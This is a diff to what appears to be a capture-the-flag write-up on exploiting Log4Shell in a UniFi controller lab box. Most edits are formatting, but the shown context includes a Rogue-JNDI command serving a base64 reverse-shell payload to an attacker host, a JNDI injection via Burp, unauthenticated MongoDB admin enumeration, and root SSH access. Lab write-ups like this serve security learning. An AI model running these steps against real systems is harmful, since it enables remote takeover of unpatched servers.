@@ -35,15 +35,18 @@ A technical walkthrough of exploiting **CVE-2021-44228 (Log4Shell)** in a UniFi 
  ```  
  ![NMAP scan result](img/Nmap_scan.png)
 The scan results revealed several open ports:
-PORT    STATE   SERVICE  VERSION
-22/tcp   open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
-6789/tcp open unifi Ubiquiti UniFi Controller
-8080/tcp open http nginx 1.18.0 (Ubuntu)
-8443/tcp open ssl/http nginx 1.18.0 (Ubuntu)
-8880/tcp open http nginx 1.18.0 (Ubuntu)
+
+| PORT | STATE | SERVICE | VERSION |
+| :--- | :--- |
+| **22/tcp** | open | ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
+| **6789/tcp** | open | unifi Ubiquiti UniFi Controller |
+| **8080/tcp** | open | http nginx 1.18.0 (Ubuntu) |
+| **8443/tcp** | open | ssl/http nginx 1.18.0 (Ubuntu) |
+| **8880/tcp** | open | http nginx 1.18.0 (Ubuntu) |
 
  ### Web Enumeration - 
  Navigating to `http://10.10.25.200:8080` automatically redirected to a login panel at `https://10.10.25.200:8443/manage`. 
+ 
  ![UniFi web UI login page](img/Unifi_Login.png)
  
  - The web page identified the running software as **"UNIFI 6.5.54"**.
@@ -72,6 +75,7 @@ Next, we set up the Rogue-JNDI server to serve this payload.
 # The command format is: "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFza...MSI=}|{base64,-d}|{bash,-i}" --hostname "[ATTACKER_IP]"
  ```
  This starts LDAP and HTTP services, ready to serve our payload.
+ 
  ![LDAP server starting](img/LDAP.HTTP.png)
  
  ### Step 2: Set Up a Netcat Listener
@@ -82,6 +86,7 @@ Next, we set up the Rogue-JNDI server to serve this payload.
 
 ### Step 3: Trigger the Vulnerability
 We used Burp Suite to intercept the login request to `https://10.10.25.200:8443/api/login` and inject our JNDI payload into the `remember` parameter. 
+
 ![Burp Log4shell Payload](img/Payload.png)
  ```json
 {
@@ -114,7 +119,9 @@ This revealed a **MongoDB** instance running locally on port `27117`. Since it w
  ### Step 1: Connect to MongoDB and Enumerate Users
  We connected to the database without needing authentication.
 ```bash mongo --port 27117 ace```
+
  ![Getting Mongo Shell](img/Mongo_shell.png)
+ 
 Inside the `ace` database, we listed the existing admin users. 
 ```javascript > db.admin.find().forEach(printjson); ```
 
@@ -162,15 +169,20 @@ With our newly created credentials (`unifi-admin`:`Password123`), we logged into
 
  ### Finding SSH Credentials
 Inside the admin panel, we navigated to **Settings > Site** and looked for the **Device Authentication** section. The application had conveniently stored the SSH credentials for the device's `root` user in plaintext. 
-📸 [INSERT IMAGE HERE: Your screenshot showing the background terminal notes with the discovered plaintext SSH password (Image 3)]
+
+![plaintext ssh password](img/ssh_password.png)
 
 ### Gaining Root and Capturing Flags
 Using the discovered credentials, we logged in via SSH as `root`.
 ```bash ssh root@10.10.25.200 ``` 
 From there, it was trivial to capture both the root and user flags.
+
  ![Root Flag](img/Root_flag.png)
+ 
 **Root Flag:** ```bash root@unifi:~# cat /root/root.txt {...root_flag_here...} ```
+
  ![User Flag](img/User_flag.png)
+ 
 **User Flag:** ```bash root@unifi:~# cat /home/michael/user.txt {...user_flag_here...} ```
 
 
